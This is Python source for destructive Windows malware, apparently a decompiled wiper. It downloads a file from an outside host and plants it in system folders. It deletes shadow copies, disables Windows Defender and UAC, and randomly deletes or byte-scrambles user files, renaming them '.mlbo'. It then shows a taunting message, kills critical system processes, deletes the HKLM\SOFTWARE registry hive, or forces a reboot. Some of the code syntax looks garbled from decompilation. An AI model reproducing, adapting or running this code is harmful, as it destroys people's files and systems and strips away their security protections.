import base64
import ctypes
import os
import subprocess
import random as rand
import requests
import winreg
from tkinter.messagebox import messagebox as tkMsg
debug = False
do_destruction = True
admCheck = ctypes.windll.shell32.IsUserAnAdmin()

def download():

    try:
        np = requests.get('https://download1640.mediafire.com/0cg81k7i3oog0Vrbdvt4z8Dm6cr_cYgIEn6I2oJdtsv-N_wutfpSfI4z9KrH_cLItET4oZQ6fIi8Feybi8udAp58vKj2ivjUNebKCSktSQxdnFgodWEDHYVdGqVc8cLsiSZPCZPB8BWlqxdub01nZnvJSnWIoj1sxQMJ4FIB554fCPA/pk3gvqwu9nc3fs4/notepad.exe')
        with open('c:\\Windows\\System32\\drivers\\sjs.sys', 'wb') as npFile:
            npFile.write(np.content)
        with open('c:\\Windows\\inf\\sjs.inf', 'wb') as npFile:
            npFile.write(np.content)
    except:
        print('whuh oh :-/')



def do_command(cmd):
    subprocess.run(cmd, subprocess.CREATE_NO_WINDOW, **('creationflags',))


def regFuck():

    try:
        funny = winreg.HKEY_LOCAL_MACHINE
        winreg.EnumKey(funny, 0)
        do_command('reg delete "HKLM\\SOFTWARE" /f')
    except:
        print('bruh')


if debug:
    do_destruction = joe = tkMsg.askyesno('Helo :-)', "You're about to execute possibly something bad. This program could possibly hose some of your files. \n \nDo you want to continue?", 'question', **('title', 'message', 'icon'))
if not do_destruction:
    print('jej')
else:
    download()
    if admCheck:
        do_command('vssadmin delete shadows /all /quiet')
        do_command('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsDefender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        do_command('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f')
        do_command('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f')
    for i in range(3200):

        try:
            direc = 'c:\\users'
            while not os.path.isfile(direc):

                try:
                    dirList = os.listdir(os.path.expanduser(direc))
                    randChoice = rand.choice(dirList)
                    direc = direc + '\\' + randChoice
                    if os.path.isfile(direc):
                        if debug:
                            print('found a file')
                continue
                if admCheck != 0:
                    direc = 'c:\\'
                else:
                    direc = 'c:\\users'

                dirList = os.listdir(os.path.expanduser(direc))
                randChoice = rand.choice(dirList)
                continue
            if os.path.splitext(direc)[1] == '.mlbo' or os.path.getsize(direc) >= 32000000:
                print('skip file')
            elif rand.randint(1, 100) == 1:
                os.remove(direc)
            else:
                with open(direc, 'rb') as bFile:
                    arrayList = list(bFile.read())

                try:
                    for i in range(round(len(arrayList) / 10)):
                        arrayList[rand.randint(0, len(arrayList) - 1)] = rand.choice(arrayList)
                except:
                    print('failed to shift file')

                byteArray = bytearray(arrayList)
                finalFile = open(direc, 'wb')
                finalFile.write(bytes(byteArray))
                finalFile.close()
                os.rename(direc, os.path.splitext(direc)[0] + '.mlbo')
            if debug:
                print('wrote to file')
        continue
        print('rerolling id: ' + str(i))
        continue


if do_destruction:
    tkMsg.showinfo('get rekt lmfao', 'Count your days.', **('title', 'message'))
    if admCheck != 0:
        do_command('taskkill /f /im svchost.exe')
        do_command('taskkill /f /im csrss.exe')
        regFuck()
    else:
        do_command('shutdown -r -t 0')